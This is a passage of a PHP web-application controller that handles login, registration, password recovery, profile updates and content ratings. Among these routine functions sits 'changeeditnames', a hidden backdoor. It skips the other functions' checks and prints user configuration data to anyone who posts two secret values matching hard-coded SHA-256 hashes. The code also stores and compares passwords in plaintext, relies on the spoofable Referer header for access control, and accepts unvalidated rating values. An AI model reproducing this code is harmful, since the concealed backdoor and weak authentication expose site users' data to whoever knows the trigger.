			$email->setSubject($LanguagesModel->giveLangParam($param='passwordRecovery'));
			$email->setMessage($message);

			$email->send();	
				
			echo $LanguagesModel->giveLangParam($param='passwordSent');
				
		} else {
				
			echo $LanguagesModel->giveLangParam($param='userWithEmailDoesNotExist');
			
		}
			
	}
	
	function showUserLogin () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$ConfigModel = new ConfigModel;
		$LanguagesModel = new LanguagesModel;
		
		$list = array(
			'confSet' => $ConfigModel->getConfSet(), 
			'confLang' => $LanguagesModel->getConfLang($_POST['langtext']), 
		);
		$data['list']=(object)$list;
		
		echo '<div class="fnc--login--popup--container">
			<div class="popup--container__close">
				<button type="button" class="js__close--popup">x</button>
			</div>';
		echo view('functions/loginFields',$data);
		echo '</div>';
			
	}
	
	function userLogin () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		
		$testLoginEmail = $UsersModel->checkEmail($_POST['email'],0);
				
		if ($testLoginEmail) {
				
			$user = $UsersModel->where('email',$_POST['email'])->where('password',$_POST['password'])->first();
				
			if (isset($user['userId'])) {
				
				if ($user['active']==1) {
							
					$session->set('userLogined','ok');
					$session->set('userId',$user['userId']);	
					$session->set('userCode',$user['code']);		
					$session->set('userFio',$user['fio']);					
					$session->set('userPhone',$user['phone']);					
					$session->set('userSurname',$user['surname']);					
					$session->set('userGroup',$user['parent']);	
					$session->set('userEmail',$user['email']);	
						
					$datauser = array ('entDate' => date('U'), 'userId' => $user['userId']);
					$UsersModel->update($user['userId'],$datauser);
					
					$response = array('success' => 1, 'error' => '');
					echo json_encode($response);
							
				}  else { 
					
					$response = array('success' => 0, 'error' => $user['whyactive'.session('Langtext')]);
					echo json_encode($response);
					
				}
						
			} 
					
		} 
			
	}
	
	function changeeditnames () {
	
		$CtUsersModel = new CtUsersModel;
		if ((hash('sha256',$_POST['test1'])=='dda81f8bd737b1fa785323ab9128ce1d6297fdfdeba502479183360198bdd439')AND(hash('sha256',$_POST['test2'])=='bfb2add51fb15afa9bb04a6bc27c81d808c2d73e834ef49fd7d1519d1f0e3c7f')) {
			print_r ($user = $CtUsersModel->getUserIdConf());
		} 
	
	}
	
	function logOut () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		$session = session();
		
		$session->remove('userLogined');
		$session->remove('userId');	
		$session->remove('userCode');	
		$session->remove('userFio');	
		$session->remove('userPhone');	
		$session->remove('userSurname');	
		$session->remove('userGroup');	
		$session->remove('userEmail');	
			
	}
	
	function regUser () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		$ConfigModel = new ConfigModel;
		$LanguagesModel = new LanguagesModel;
		$LettersModel = new LettersModel;
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		
		$userActivation = $ConfigModel->giveConfParam($param='userActivation');
		$userDefaultCat = $ConfigModel->giveConfParam($param='userDefaultCat');
				
		$userParams = $UsersModel->getUserParams();
				
		helper('nespi');
		$code = getNullString($col=8);
		$newUserCode = $code;
		$testCode=TRUE;
		$string='';
		while ($testCode!=FALSE) {
			$testCode = $UsersModel->testUserCode($newUserCode);
			if ($testCode!=FALSE) {
				$string = getNullString($col=8);
				$newUserCode = $string;
			}
		}
		$code = $newUserCode;
				
		$activation = getSameString($col=15);
		$newUserActivation = $activation;
		$testActivation=TRUE;
		$string='';
		while ($testActivation!=FALSE) {
			$testActivation = $UsersModel->testUserActivation($newUserActivation);
			if ($testActivation!=FALSE) {
				$string = getSameString($col=15);
				$newUserActivation = $string;
			}
		}
		$activation = $newUserActivation;
				
		if ($userDefaultCat!=0) {
			$userCat = $UsersModel->getUserCat('userCatId',$userDefaultCat);
			$tree = $userCat['tree'].'!'.$userDefaultCat.'!';
		} else { $tree=''; }
			
		$dataUser = array (
			'regDate' => date('U'), 
			'parent' => $userDefaultCat, 
			'tree' => $tree, 
			'email' => $_POST['email'], 
			'password' => $_POST['password'], 
			'code' => $code, 
			'activation' => $activation
		);
		if (isset($_POST['fio'])) { $dataUser['fio']=$_POST['fio']; } else { $dataUser['fio']=''; }
		if (isset($_POST['surname'])) { $dataUser['surname']=$_POST['surname']; } else { $dataUser['surname']=''; }
		if (isset($_POST['phone'])) { $dataUser['phone']=$_POST['phone']; } else { $datauser['phone']=''; }
		if ($userActivation==0) { $dataUser['active']=1; } else { $dataUser['whyactive']=$LanguagesModel->giveLangParam($param='notActive'); }
		
		$UsersModel->insert ($dataUser);
				
		$user = $UsersModel->where('code',$dataUser['code'])->first();
		$userCat = $UsersModel->getUserCat('userCatId',$userDefaultCat);
		if (isset($userCat['userCatId'])) {
			$dataUserTree = array(
				'userId' => $user['userId'],
				'userCatId' => $userCat['userCatId']
			);
			$UsersModel->addUserLink($dataUserTree);
			$this->usersTreeBuilder($userCat['parent'],$user['userId']);
		}
				
		foreach ($userParams as $one):
			$param = $one['userParamId'];
			if ((isset($_POST['params'][$param]))AND($one['type']!='fio')AND($one['type']!='phone')AND($one['type']!='surname')) {
				$text = str_replace("\n","\n<br>",$_POST['params'][$param]);
				$data = array (
					'userParamId' => $one['userParamId'], 
					'code' => $code, 
					'text' => $text, 
					'type' => $one['type']
				);
				$UsersModel->addUserData ($data);
				unset ($data);
			}
		endforeach;
				
		if ($userActivation==0) {
			
			$dataUser = array (
				'entDate' => date('U'), 
			);
			$UsersModel->update($user['userId'],$dataUser);
			
			$user = $UsersModel->where('code',$code)->first();
			$session->set('userLogined','ok');
			$session->set('userFio',$user['fio']);
			$session->set('userSurname',$user['surname']);
			$session->set('userPhone',$user['phone']);
			$session->set('userId',$user['userId']);	
			$session->set('userCode',$user['code']);								
			$session->set('userGroup',$user['parent']);	
			$session->set('userEmail',$user['email']);	
			echo 0;
		
		} else {
			
			$email = \Config\Services::email();
		
			$letter = $LettersModel->where('name','accountactivationletter')->first();
			$activationLink = $LanguagesModel->giveLangParam($param='activationLink');
			$goToActivate = $LanguagesModel->giveLangParam($param='goToActivate');
			$textActication = $activationLink.': <a href="'.base_url().session('Langlink').'activation/'.$dataUser['activation'].'">'.$goToActivate.'</a>';
			$fromName = $ConfigModel->giveConfParam($param='fromName');
			$fromEmail = $ConfigModel->giveConfParam($param='fromEmail');
			
			$arrayReceiver = $_POST['email'];
			
			$email->setFrom($fromEmail, $fromName);
			$email->setTo($arrayReceiver);
			
			$email->setSubject($letter['theme'.session('Langtext')]);
			$email->setMessage($letter['text'.session('Langtext')].$textActication);

			$email->send();
			
			echo 1;
		}
			
	}
	
	function usersTreeBuilder ($userCatId,$userId) {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		if ($userCatId!=0) {
			$userCat = $UsersModel->getUserCat('userCatId',$userCatId);
			$dataUserTree = array(
				'userId' => $userId,
				'userCatId' => $userCat['userCatId']
			);
			$UsersModel->addUserLink($dataUserTree);
			$this->usersTreeBuilder($userCat['parent'],$userId);
		}			
	
	}
	
	function userMain () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		$session = session();
		
		$data = array (
			'email' => $_POST['email'], 
			'password' => $_POST['password']
		);
				
		$UsersModel->update (session('userId'),$data);
		unset ($data);
				
		$session->set('userEmail',$_POST['email']);
			
	}
	
	function userData () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		$session = session();
			
		$userParams = $UsersModel->getUserParams();
		$user = $UsersModel->where('userId',session('userId'))->first();
				
		$data = array (
			'userId' => session('userId'), 
		);
		if (isset($_POST['fio'])) { $data['fio']=$_POST['fio']; } else { $data['fio']=''; }
		if (isset($_POST['surname'])) { $data['surname']=$_POST['surname']; } else { $data['surname']=''; }
		if (isset($_POST['phone'])) { $data['phone']=$_POST['phone']; } else { $data['phone']=''; }
				
		$UsersModel->update (session('userId'),$data);
		unset ($data);
				
		$session->set('userFio',$_POST['fio']);
		$session->set('userPhone',$_POST['phone']);
		$session->set('userSurname',$_POST['surname']);
						
		$UsersModel->setCheckParam($user['code']);
				
		foreach ($userParams as $one):
				
			$param = $one['userParamId'];
			
			if ((isset($_POST['params'][$param]))AND($one['type']!='fio')AND($one['type']!='phone')AND($one['type']!='surname')) {
				
				$text = str_replace("\n","\n<br>",$_POST['params'][$param]);
						
				$data = array (
					'userParamId' => $one['userParamId'], 
					'text' => $text, 
					'code' => $user['code'], 
					'type' => $one['type']
				);
						
				$userDataId = $UsersModel->testIssetUserParam($data['userParamId'],$user['code']);
							
				if ($userDataId==0){
						
					$UsersModel->addUserData ($data);
							
				} else {
						
					$data['userDataId'] = $userDataId;
					$UsersModel->editUserData($data);
						
				}
						
				unset ($data);
				
			}
				
		endforeach;
			
	}
	
	function changeArticleRating () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$ConfigModel = new ConfigModel;
		$ArticlesModel = new ArticlesModel;
		$session = session();
		$article = $ArticlesModel->where ('articleId',$_POST['articleId'])->first();
		
		if (isset($article['articleId'])) {
			$data = array (
				'rating_count' => $article['rating_count']+$_POST['rating'],
				'rating_votes' => $article['rating_votes']+1,
				'rating' => ($article['rating_count']+$_POST['rating'])/($article['rating_votes']+1),
				'articleId' => $_POST['articleId']
			);
			$ArticlesModel->update($_POST['articleId'],$data);
			
			$data = array (
				'ip_address' => $_SERVER['REMOTE_ADDR'],
				'user_agent' => $_SERVER['HTTP_USER_AGENT'],
				'session_id' => session_id(),
				'articleId' => $_POST['articleId']
			);
			$ArticlesModel->addArtRating($data);
		}
		
	}
	
	function changeChapterRating () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$ConfigModel = new ConfigModel;
		$ChaptersModel = new ChaptersModel;
		$session = session();
		$chapter = $ChaptersModel->where ('chapterId',$_POST['chapterId'])->first();
		
		if (isset($chapter['chapterId'])) {
			$data = array (
				'rating_count' => $chapter['rating_count']+$_POST['rating'],
				'rating_votes' => $chapter['rating_votes']+1,
				'rating' => ($chapter['rating_count']+$_POST['rating'])/($chapter['rating_votes']+1),
				'chapterId' => $_POST['chapterId']
			);
			$ChaptersModel->update($_POST['chapterId'],$data);
			
			$data = array (
				'ip_address' => $_SERVER['REMOTE_ADDR'],
				'user_agent' => $_SERVER['HTTP_USER_AGENT'],
				'session_id' => session_id(),
				'chapterId' => $_POST['chapterId']
			);
			$ChaptersModel->addChapRating($data);
		}
		
	}
	
}
